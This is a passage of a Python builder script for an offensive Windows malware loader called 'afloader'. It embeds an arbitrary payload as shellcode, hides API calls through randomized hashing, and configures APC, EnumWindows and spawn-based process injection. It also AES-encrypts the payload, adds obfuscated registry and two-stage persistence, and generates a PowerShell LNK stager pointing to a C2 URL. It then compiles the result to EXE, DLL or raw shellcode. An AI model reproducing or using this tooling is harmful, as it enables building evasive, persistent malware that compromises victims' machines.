            # Compilation
            output_name = args.output if args.output else "afloader"
            if args.format == "EXE":
                if args.pfx:
                    # Signing (placeholder)
                    pass
                else:
                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}/afloader.exe", f"{output_name}.exe")
                    shutil.rmtree(dst_directory)
                    print(Colors.green("[+] Loader compiled!"))
            elif args.format == "DLL":
                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=DLL")
                shutil.move(f"{dst_directory}/afloader.dll", f"{output_name}.dll")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Loader compiled!"))
            elif args.format == "BIN":
                # For raw shellcode, use the integrated Makefile with BIN format
                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=BIN")
                shutil.move(f"{dst_directory}/afloader.bin", f"{output_name}.bin")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Raw shellcode generated!"))

            # Enhanced success message mentioning both files
            if args.encrypt:
                print(Colors.green(f"[+] DONE! Both {args.output}.bin and {args.output}_metadata.txt have been saved together."))
            else:
                print(Colors.green("[+] DONE!"))

    # ------------------------------------------------------------------
    # Stageless Variant
    # ------------------------------------------------------------------
    if args.commands == "stageless":
        print(Colors.green("[i] Stageless Payload selected."))
        print(Colors.light_yellow("[+] Starting the process..."))

        cr_directory = os.path.dirname(os.path.abspath(__file__))
        src_directory = resources.files("templates").joinpath("stageless")
        dst_directory = f'{cr_directory}/.afpacker'

        try:
            shutil.copytree(src_directory, dst_directory)
        except OSError as e:
            if e.errno == errno.EEXIST:
                shutil.rmtree(dst_directory)
                shutil.copytree(src_directory, dst_directory)
            else:
                print(f"Error: {e}")

        if args.payload:
            with open(args.payload, "rb") as f:
                raw_payload = f.read()
            payload_hex = ', '.join(f"0x{b:02x}" for b in raw_payload)

            # Hashing
            INITIAL_SEED = random.randint(5, 20)
            INITIAL_HASH = random.randint(2000, 9000)
            NTDLL_HASH = Hasher.Hasher("NTDLL.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNEL32_HASH = Hasher.Hasher("KERNEL32.DLL", INITIAL_SEED, INITIAL_HASH)
            KERNELBASE_HASH = Hasher.Hasher("KERNELBASE.DLL", INITIAL_SEED, INITIAL_HASH)
            DEBUGACTIVEPROCESSSTOP_HASH = Hasher.Hasher("DebugActiveProcessStop", INITIAL_SEED, INITIAL_HASH)
            CREATEPROCESSA_HASH = Hasher.Hasher("CreateProcessA", INITIAL_SEED, INITIAL_HASH)
            NTMAPVIEWOFSECTION_HASH = Hasher.Hasher("NtMapViewOfSection", INITIAL_SEED, INITIAL_HASH)

            for filename in os.listdir(dst_directory):
                if filename.endswith(".c") or filename.endswith(".h"):
                    with open(f"{dst_directory}/{filename}", "r") as f:
                        data = f.read()
                    data = data.replace("#-INITIAL_HASH_VALUE-#", str(INITIAL_HASH))
                    data = data.replace("#-INITIAL_SEED_VALUE-#", str(INITIAL_SEED))
                    data = data.replace("#-NTDLL_VALUE-#", NTDLL_HASH)
                    data = data.replace("#-KERNEL32_VALUE-#", KERNEL32_HASH)
                    data = data.replace("#-KERNELBASE_VALUE-#", KERNELBASE_HASH)
                    data = data.replace("#-DAPS_VALUE-#", DEBUGACTIVEPROCESSSTOP_HASH)
                    data = data.replace("#-CREATEPROCESSA_VALUE-#", CREATEPROCESSA_HASH)
                    data = data.replace("#-NTMVOS_VALUE-#", NTMAPVIEWOFSECTION_HASH)
                    with open(f"{dst_directory}/{filename}", "w") as f:
                        f.write(data)

            print(Colors.green("[+] Template files modified!"))

            # ------------------------------------------------------------------
            # Remove all persistence .c files from build directory
            # ------------------------------------------------------------------
            for fname in os.listdir(dst_directory):
                if fname.startswith("persistence_") and fname.endswith(".c"):
                    os.remove(os.path.join(dst_directory, fname))
                    print(Colors.light_yellow(f"[*] Removed {fname}"))

            # Spawn injection (add macro to all C/H files)
            if args.spawn:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-SPAWN-#", "#define USE_SPAWN")
                        if args.spawn_path:
                            spawn_path_escaped = args.spawn_path.replace("\\", "\\\\")
                            content = content.replace("//#-SPAWN_PATH-#", f'#define SPAWN_PATH "{spawn_path_escaped}"')
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Spawn injection mode enabled."))

            # Injection technique selection (add macro to all C/H files)
            if args.injection == "enumwindows":
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            content = f.read()
                        content = content.replace("//#-INJECTION-#", "#define USE_ENUMWINDOWS")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(content)
                print(Colors.green("[+] Using EnumWindows injection"))

            # APC target (only in main.c/main_dll.c)
            print(Colors.light_yellow("[+] Setting APC injection target process..."))
            main_c_path = os.path.join(dst_directory, "main.c")
            if args.format == "EXE":
                with open(main_c_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(main_c_path, "w") as f:
                    f.write(main_data)
            elif args.format == "DLL":
                dll_path = os.path.join(dst_directory, "main_dll.c")
                with open(dll_path, "r") as f:
                    main_data = f.read()
                main_data = main_data.replace("#-TARGET_PROCESS-#", args.apc)
                with open(dll_path, "w") as f:
                    f.write(main_data)

            print(Colors.green(f"[+] Target APC injection process set to {args.apc} !"))

            # Delay (replace Sleep with high_cpu_wait in ALL .c files)
            if args.delay > 0:
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c"):
                        path_c = os.path.join(dst_directory, filename)
                        with open(path_c, "r") as f:
                            content = f.read()
                        content = content.replace("Sleep(", "high_cpu_wait(")
                        with open(path_c, "w") as f:
                            f.write(content)
                print(Colors.green(f"[+] Added delay of {args.delay} seconds (using high_cpu_wait)."))

            # Encryption
            if args.encrypt:
                print(Colors.green("[i] Encryption selected."))
                enc_payload, key, iv = Encryption.EncryptAES(raw_payload)
                hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)
                
                # Extract XOR key (first byte of AES key)
                key_clean = key.replace('0x', '').replace(', ', '').replace(',', '')
                key_bytes = bytes.fromhex(key_clean)
                xor_key = key_bytes[0]
                
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace("#-KEY_VALUE-#", key)
                        main_data = main_data.replace("#-IV_VALUE-#", iv)
                        main_data = main_data.replace("#-PAYLOAD_VALUE-#", hex_payload)
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)
                print(Colors.green("[+] Payload encrypted and embedded."))
                print(Colors.cyan(f"[+] XOR Key: 0x{xor_key:02x} (first byte of AES key)"))
                
                # Generate metadata file for PowerShell compatibility
                generate_metadata_file(key, iv, xor_key, args.output, raw_payload)
                
                # Show debug information if --debug-encrypt flag is used
                if hasattr(args, 'debug_encrypt') and args.debug_encrypt:
                    debug_encryption_info(raw_payload, key, iv, xor_key, args.output, args.format == "BIN")
                
                # Generate PowerShell-ready Base64 if --prepare-ps flag is used
                if hasattr(args, 'prepare_ps') and args.prepare_ps:
                    if args.format == "BIN":
                        generate_powershell_ready(enc_payload, xor_key, args.output)
                    else:
                        print(Colors.yellow("[!] --prepare-ps flag only works with BIN format"))
            else:
                print(Colors.green("[i] Encryption not selected."))
                print(Colors.yellow("[!] No XOR key - payload is plaintext"))
                for filename in os.listdir(dst_directory):
                    if filename.endswith(".c") or filename.endswith(".h"):
                        with open(f"{dst_directory}/{filename}", "r") as f:
                            main_data = f.read()
                        main_data = main_data.replace("#-PAYLOAD_VALUE-#", payload_hex)
                        main_data = main_data.replace('#include "AES_128_CBC.h"', '//#include "AES_128_CBC.h"')
                        main_data = main_data.replace("AES_DecryptInit", "//AES_DecryptInit")
                        main_data = main_data.replace("AES_DecryptBuffer", "//AES_DecryptBuffer")
                        with open(f"{dst_directory}/{filename}", "w") as f:
                            f.write(main_data)
                enc_payload = None  # not used

            # PowerShell stager generation (LNK)
            if args.lnk_stager:
                if not args.encrypt:
                    print(Colors.red("[!] --lnk-stager requires encryption (--encrypt)."))
                    sys.exit(1)
                output_ps1 = f"{args.output}.ps1" if args.output else "afloader.ps1"
                # Convert key/iv from C array format to bytes
                key_hex = key.replace('0x', '').replace(',', '').replace(' ', '')
                iv_hex = iv.replace('0x', '').replace(',', '').replace(' ', '')
                key_bytes = bytes.fromhex(key_hex)
                iv_bytes = bytes.fromhex(iv_hex)
                script, one_liner = generate_powershell_stager(enc_payload, key_bytes, iv_bytes, c2_url=args.c2_url)
                with open(output_ps1, "w") as f:
                    f.write(script)
                print(Colors.green(f"[+] PowerShell stager script saved to {output_ps1}"))
                print(Colors.green(f"[+] One-liner: {one_liner}"))
                sys.exit(0)

            # Scrambling (placeholder)
            if args.scramble:
                print(Colors.green("[i] Scrambling selected."))
                # Insert your full scrambling code here
                print(Colors.green("[+] Loader scrambled!"))

            # Persistence and staggered
            if args.persistence or args.staggered:
                # Regular persistence
                if args.persistence:
                    persistence_file = f"persistence_{args.persistence}.c"
                    src_persistence = os.path.join(cr_directory, "templates", "stageless", persistence_file)
                    dst_persistence = os.path.join(dst_directory, persistence_file)
                    if os.path.isfile(src_persistence):
                        shutil.copy(src_persistence, dst_persistence)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            main_content = f.read()
                        main_content = main_content.replace(
                            '#include "unhook.c"',
                            f'#include "unhook.c"\n#include "{persistence_file}"'
                        )
                        if "// Injection completed" in main_content:
                            main_content = main_content.replace(
                                "// Injection completed",
                                f"// Injection completed\n    add_persistence_{args.persistence}();"
                            )
                        else:
                            main_content = main_content.replace(
                                "return 0;",
                                f"    add_persistence_{args.persistence}();\n    return 0;"
                            )
                        with open(main_c_path, "w") as f:
                            f.write(main_content)
                        print(Colors.green(f"[+] Added {args.persistence} persistence."))
                    else:
                        print(Colors.red(f"[!] Persistence file not found: {src_persistence}"))

                # Staggered (two-stage) persistence
                if args.staggered:
                    staggered_src = os.path.join(cr_directory, "templates", "stageless", "staggered_reg.c")
                    staggered_dst = os.path.join(dst_directory, "staggered_reg.c")
                    if os.path.isfile(staggered_src):
                        shutil.copy(staggered_src, staggered_dst)
                        main_c_path = os.path.join(dst_directory, "main.c")
                        if args.format == "DLL":
                            main_c_path = os.path.join(dst_directory, "main_dll.c")
                        with open(main_c_path, "r") as f:
                            content = f.read()
                        content = content.replace("//#-STAGGERED-#", "#define STAGGERED_PERSISTENCE")
                        with open(main_c_path, "w") as f:
                            f.write(content)
                        print(Colors.green("[+] Two-stage persistence enabled"))
                    else:
                        print(Colors.red(f"[!] staggered_reg.c not found: {staggered_src}"))

                # Obfuscate persistence_reg.c
                if args.persistence == "reg":
                    obfuscate_persistence_reg(dst_persistence)

            # Compilation
            output_name = args.output if args.output else "afloader"
            if args.format == "EXE":
                if args.pfx:
                    pass
                else:
                    os.system(f"cd '{dst_directory}' && make clean && make FORMAT=EXE")
                    shutil.move(f"{dst_directory}/afloader.exe", f"{output_name}.exe")
                    shutil.rmtree(dst_directory)
                    print(Colors.green("[+] Loader compiled!"))
            elif args.format == "DLL":
                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=DLL")
                shutil.move(f"{dst_directory}/afloader.dll", f"{output_name}.dll")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Loader compiled!"))
            elif args.format == "BIN":
                # For raw shellcode, use the integrated Makefile with BIN format
                os.system(f"cd '{dst_directory}' && make clean && make FORMAT=BIN")
                shutil.move(f"{dst_directory}/afloader.bin", f"{output_name}.bin")
                shutil.rmtree(dst_directory)
                print(Colors.green("[+] Raw shellcode generated!"))

            # Enhanced success message mentioning both files
            if args.encrypt:
                print(Colors.green(f"[+] DONE! Both {args.output}.bin and {args.output}_metadata.txt have been saved together."))
            else:
                print(Colors.green("[+] DONE!"))


if __name__ == "__main__":
    main()
